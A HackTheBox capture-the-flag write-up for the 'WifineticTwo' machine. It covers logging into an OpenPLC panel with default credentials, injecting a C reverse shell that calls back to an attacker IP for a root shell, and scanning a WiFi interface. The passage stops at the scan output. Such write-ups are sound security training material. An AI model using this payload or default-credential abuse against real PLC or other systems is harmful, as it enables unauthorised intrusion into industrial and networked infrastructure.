<!doctype html><html lang=en><head><title>HTB WifineticTwo WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'WifineticTwo' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB WifineticTwo WriteUp"><meta name=twitter:description content="HackThebox 'WifineticTwo' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/wifinetictwo/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB WifineticTwo WriteUp"><meta property="og:description" content="HackThebox 'WifineticTwo' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-07-27T00:00:00+00:00"><meta property="article:modified_time" content="2024-07-27T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Medium"><meta property="article:tag" content="C"><meta property="article:tag" content="Wifi"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/wifinetictwo/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/wifinetictwo/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/wifinetictwo/>HTB WifineticTwo WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-07-27T00:00:00Z>27 July, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
9-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/medium/>Medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/c/>C</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/wifi/>Wifi</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/oneshot/>Oneshot</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/openplc/>Openplc</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/pixie-dust-attack/>Pixie Dust Attack</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/wpa/>Wpa</a></span></div></div></header><div class=post-content><h1 id=wifinetictwo----hackthebox>WifineticTwo &ndash; HackTheBox
<a class=heading-link href=#wifinetictwo----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Medium</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;WifineticTwo&rsquo; Avatar" src=/pentesting/images/WifineticTwo_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>WifineticTwo</code> is a medium <code>Linux</code> machine from <code>HackTheBox</code>. After an initial <code>TCP</code> scan ports, they show the victim machine is running a website. This website is the login portal for <code>OpenPLC</code>, a Programmable Logic Controler (PLC) software. Fortunately, this portal uses default credentials for <code>OpenPLC</code> software and we are able to access to the panel. Inside it, we are able to inject code in <code>C</code> and gain initial access to the target machine. Checking the net interfaces, we note there is a <code>WiFi</code> net interface. Analyzing the <code>WiFi</code> net configuration we note that we could then perform a <code>Pixie Dust Attack</code> and steal credentials for the wireless interface. With these stolen credentials we are able to log into the main router, which is the final objective of the machine.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>We start by looking for open <code>TCP</code> ports in the target machine with <code>Nmap</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS -p- --open --min-rate=5000 -n -Pn -vvv 10.10.11.7
</span></span></span></code></pre></div><ul><li>The scan shows only 2 ports open: <code>22</code> <code>SSH</code> and <code>8080</code> <code>HTTP</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,8080 10.10.11.7 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 20:56 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.7
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.17s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE    VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
</span></span></span><span class=line><span class=cl><span class=go>|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
</span></span></span><span class=line><span class=cl><span class=go>| http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
</span></span></span><span class=line><span class=cl><span class=go>|_Requested resource was http://10.10.11.7:8080/login
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   FourOhFourRequest:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.0 404 NOT FOUND
</span></span></span><span class=line><span class=cl><span class=go>|     content-type: text/html; charset=utf-8
</span></span></span><span class=line><span class=cl><span class=go>|     content-length: 232
</span></span></span><span class=line><span class=cl><span class=go>|     vary: Cookie
</span></span></span><span class=line><span class=cl><span class=go>|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zk_lzw.ST-G_x-51p-hrlnoJWimVQD7K9Y; Expires=Fri, 24-May-2024 01:01:47 GMT; HttpOnly; Path=/
</span></span></span><span class=line><span class=cl><span class=go>|     server: Werkzeug/1.0.1 Python/2.7.18
</span></span></span><span class=line><span class=cl><span class=go>|     date: Fri, 24 May 2024 00:56:47 GMT
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;title&gt;404 Not Found&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Not Found&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=go>|   GetRequest:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.0 302 FOUND
</span></span></span><span class=line><span class=cl><span class=go>|     content-type: text/html; charset=utf-8
</span></span></span><span class=line><span class=cl><span class=go>|     content-length: 219
</span></span></span><span class=line><span class=cl><span class=go>|     location: http://0.0.0.0:8080/login
</span></span></span><span class=line><span class=cl><span class=go>|     vary: Cookie
</span></span></span><span class=line><span class=cl><span class=go>|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.Zk_lzQ.6sVEZe2_89oZVXIkhWgb6zwWALU; Expires=Fri, 24-May-2024 01:01:45 GMT; HttpOnly; Path=/
</span></span></span><span class=line><span class=cl><span class=go>|     server: Werkzeug/1.0.1 Python/2.7.18
</span></span></span><span class=line><span class=cl><span class=go>|     date: Fri, 24 May 2024 00:56:45 GMT
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;title&gt;Redirecting...&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;p&gt;You should be redirected automatically to target URL: &lt;a href=&#34;/login&#34;&gt;/login&lt;/a&gt;. If not click the link.
</span></span></span><span class=line><span class=cl><span class=go>|   HTTPOptions:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.0 200 OK
</span></span></span><span class=line><span class=cl><span class=go>|     content-type: text/html; charset=utf-8
</span></span></span><span class=line><span class=cl><span class=go>|     allow: HEAD, OPTIONS, GET
</span></span></span><span class=line><span class=cl><span class=go>|     vary: Cookie
</span></span></span><span class=line><span class=cl><span class=go>|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zk_lzg.3ADo50DfUqDOgDH8Oq9HKvfLk_4; Expires=Fri, 24-May-2024 01:01:46 GMT; HttpOnly; Path=/
</span></span></span><span class=line><span class=cl><span class=go>|     content-length: 0
</span></span></span><span class=line><span class=cl><span class=go>|     server: Werkzeug/1.0.1 Python/2.7.18
</span></span></span><span class=line><span class=cl><span class=go>|     date: Fri, 24 May 2024 00:56:46 GMT
</span></span></span><span class=line><span class=cl><span class=go>|   RTSPRequest:
</span></span></span><span class=line><span class=cl><span class=go>|     HTTP/1.1 400 Bad request
</span></span></span><span class=line><span class=cl><span class=go>|     content-length: 90
</span></span></span><span class=line><span class=cl><span class=go>|     cache-control: no-cache
</span></span></span><span class=line><span class=cl><span class=go>|     content-type: text/html
</span></span></span><span class=line><span class=cl><span class=go>|     connection: close
</span></span></span><span class=line><span class=cl><span class=go>|     &lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=go>|     Your browser sent an invalid request.
</span></span></span><span class=line><span class=cl><span class=go>|_    &lt;/body&gt;&lt;/html&gt;
</span></span></span><span class=line><span class=cl><span class=go>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 39.85 seconds
</span></span></span></code></pre></div><ul><li>Visiting <code>http://10.10.11.7:8080</code> redirects to <code>http://10.10.11.7:8080/login</code>, where we can see a login panel for <code>OpenPLC</code>:</li></ul><p><img alt="WifineticTwo 1" src=/pentesting/images/WifineticTwo_1.png></p><blockquote><p><code>OpenPLC</code> is an open-source Programmable Logic Controller (PLC) that is based on an easy to use software. It is the first fully functional standardized open source PLC, both in software and in hardware.</p></blockquote><ul><li>As can be found in <a href=https://github.com/openplcproject/openplcproject.github.io/blob/master/runtime/windows/index.md class=external-link target=_blank rel=noopener>OpenPLC official repository</a> the default credentials are <code>openplc:openplc</code>. Using these credentials in the panel work, and we are in:</li></ul><p><img alt="WifineticTwo 2" src=/pentesting/images/WifineticTwo_2.png></p><ul><li>Once in, and analyzing the page, if we go to <code>Hardware</code> option at the left side, we can see a page like:</li></ul><p><img alt="WifineticTwo 3" src=/pentesting/images/WifineticTwo_3.png></p><ul><li>This site apparently accepts scripts in <code>C</code> programming language. The code shows some functions called <code>initCustomLayer</code>, <code>updateCustomIn</code> and <code>updateCustomOut</code>, but they are empty. So I go to <code>Reverse Shell Generator</code> page (<a href=https://www.revshells.com/ class=external-link target=_blank rel=noopener>https://www.revshells.com/</a>), go to <code>C</code> payload, change my IP address and port to <code>10.10.16.2</code> (my attacker&rsquo;s IP) and <code>443</code> (the port I will start listening with <code>netcat</code>). The generated code is:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/socket.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;netinet/in.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;arpa/inet.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>port</span> <span class=o>=</span> <span class=mi>443</span><span class=p>;</span> <span class=c1>// Listening port
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=n>revsockaddr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>sockt</span> <span class=o>=</span> <span class=nf>socket</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>revsockaddr</span><span class=p>.</span><span class=n>sin_family</span> <span class=o>=</span> <span class=n>AF_INET</span><span class=p>;</span>       
</span></span><span class=line><span class=cl>    <span class=n>revsockaddr</span><span class=p>.</span><span class=n>sin_port</span> <span class=o>=</span> <span class=nf>htons</span><span class=p>(</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>revsockaddr</span><span class=p>.</span><span class=n>sin_addr</span><span class=p>.</span><span class=n>s_addr</span> <span class=o>=</span> <span class=nf>inet_addr</span><span class=p>(</span><span class=s>&#34;10.10.16.2&#34;</span><span class=p>);</span> <span class=c1>// Change to your IP
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>connect</span><span class=p>(</span><span class=n>sockt</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr</span> <span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>revsockaddr</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=k>sizeof</span><span class=p>(</span><span class=n>revsockaddr</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>dup2</span><span class=p>(</span><span class=n>sockt</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dup2</span><span class=p>(</span><span class=n>sockt</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dup2</span><span class=p>(</span><span class=n>sockt</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span> <span class=k>const</span> <span class=n>argv</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nf>execvp</span><span class=p>(</span><span class=s>&#34;sh&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>       
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li>We <em>append</em> this code to the original code (<em>do not replace all of it</em>). I paste the payload code within the function <code>updateCustomOut()</code>, so it looks like:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;ladder.h&#34;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/socket.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;netinet/in.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;arpa/inet.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>ignored_bool_inputs</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=o>-</span><span class=mi>1</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>ignored_bool_outputs</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=o>-</span><span class=mi>1</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>ignored_int_inputs</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=o>-</span><span class=mi>1</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>ignored_int_outputs</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=o>-</span><span class=mi>1</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>initCustomLayer</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>updateCustomIn</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>updateCustomOut</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>port</span> <span class=o>=</span> <span class=mi>443</span><span class=p>;</span> <span class=c1>// Listening port
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=n>revsockaddr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>sockt</span> <span class=o>=</span> <span class=nf>socket</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>revsockaddr</span><span class=p>.</span><span class=n>sin_family</span> <span class=o>=</span> <span class=n>AF_INET</span><span class=p>;</span>       
</span></span><span class=line><span class=cl>    <span class=n>revsockaddr</span><span class=p>.</span><span class=n>sin_port</span> <span class=o>=</span> <span class=nf>htons</span><span class=p>(</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>revsockaddr</span><span class=p>.</span><span class=n>sin_addr</span><span class=p>.</span><span class=n>s_addr</span> <span class=o>=</span> <span class=nf>inet_addr</span><span class=p>(</span><span class=s>&#34;10.10.16.2&#34;</span><span class=p>);</span> <span class=c1>// Change to your IP
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>connect</span><span class=p>(</span><span class=n>sockt</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr</span> <span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>revsockaddr</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=k>sizeof</span><span class=p>(</span><span class=n>revsockaddr</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>dup2</span><span class=p>(</span><span class=n>sockt</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dup2</span><span class=p>(</span><span class=n>sockt</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>dup2</span><span class=p>(</span><span class=n>sockt</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span> <span class=k>const</span> <span class=n>argv</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nf>execvp</span><span class=p>(</span><span class=s>&#34;sh&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span> 
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li>I start a <code>netcat</code> listener on port <code>443</code>and click on <code>Save changes</code>. The program successfully compiles, but nothing happens. Back to the <code>Dashboard</code> at the bottom left I can see a button that says <code>Start PLC</code>. When I click on it I get a shell in my <code>netcat</code> listener as <code>root</code> user:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.7] 58690
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><ul><li>However, I note that my IP address is not the same as the target IP address:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica01:/opt/PLC/OpenPLC_v3/webserver# hostname -I
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.0.3.2 10.0.3.52
</span></span></span></code></pre></div><p>so we might be inside a container or something similar. I also note that inside <code>/root</code> directory we have a <code>user.txt</code> flag&mldr; so we already have the user flag.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Running <code>ip a</code> shows that we have a net interface called <code>wlan0</code>, which is usually the ones used for WiFi. Based on the machine name, I assume this should be a hint. We then analyze the interface <code>wlan0</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica01:/opt/PLC/OpenPLC_v3/webserver# iw dev wlan0 scan
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>BSS 02:00:00:00:01:00(on wlan0)
</span></span></span><span class=line><span class=cl><span class=go>        last seen: 4163.844s [boottime]
</span></span></span><span class=line><span class=cl><span class=go>        TSF: 1716516063819443 usec (19867d, 02:01:03)
</span></span></span><span class=line><span class=cl><span class=go>        freq: 2412
</span></span></span><span class=line><span class=cl><span class=go>        beacon interval: 100 TUs
</span></span></span><span class=line><span class=cl><span class=go>        capability: ESS Privacy ShortSlotTime (0x0411)
</span></span></span><span class=line><span class=cl><span class=go>        signal: -30.00 dBm
</span></span></span><span class=line><span class=cl><span class=go>        last seen: 0 ms ago
</span></span></span><span class=line><span class=cl><span class=go>        Information elements from Probe Response frame:
</span></span></span><span class=line><span class=cl><span class=go>        SSID: plcrouter
</span></span></span><span class=line><span class=cl><span class=go>        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0
</span></span></span><span class=line><span class=cl><span class=go>        DS Parameter set: channel 1
</span></span></span><span class=line><span class=cl><span class=go>        ERP: Barker_Preamble_Mode
</span></span></span><span class=line><span class=cl><span class=go>        Extended supported rates: 24.0 36.0 48.0 54.0
</span></span></span><span class=line><span class=cl><span class=go>        RSN:     * Version: 1
</span></span></span><span class=line><span class=cl><span class=go>                 * Group cipher: CCMP
</span></span></span><span class=line><span class=cl><span class=go>                 * Pairwise ciphers: CCMP
</span></span></span><span class=line><span class=cl><span class=go>                 * Authentication suites: PSK
</span></span></span><span class=line><span class=cl><span class=go>                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
</span></span></span><span class=line><span class=cl><span class=go>        Supported operating classes:
</span></span></span><span class=line><span class=cl><span class=go>                 * current operating class: 81
</span></span></span><span class=line><span class=cl><span class=go>        Extended capabilities:
</span></span></span><span class=line><span class=cl><span class=go>                 * Extended Channel Switching
</span></span></span><span class=line><span class=cl><span class=go>                 * SSID List
</span></span></span><span class=line><span class=cl><span class=go>                 * Operating Mode Notification
</span></span></span><span class=line><span class=cl><span class=go>        WPS:     * Version: 1.0
</span></span></span><span class=line><span class=cl><span class=go>                 * Wi-Fi Protected Setup State: 2 (Configured)
</span></span></span><span class=line><span class=cl><span class=go>                 * Response Type: 3 (AP)
</span></span></span><span class=line><span class=cl><span class=go>                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
</span></span></span><span class=line><span class=cl><span class=go>                 * Manufacturer:
</span></span></span><span class=line><span class=cl><span class=go>                 * Model:
</span></span></span><span class=line><span class=cl><span class=go>                 * Model Number:
</span></span></span><span class=line><span class=cl><span class=go>                 * Serial Number:
</span></span></span><span class=line><span class=cl><span class=go>                 * Primary Device Type: 0-00000000-0
</span></span></span><span class=line><span class=cl><span class=go>                 * Device name:
</span></span></span><span class=line><span class=cl><span class=go>                 * Config methods: Label, Display, Keypad
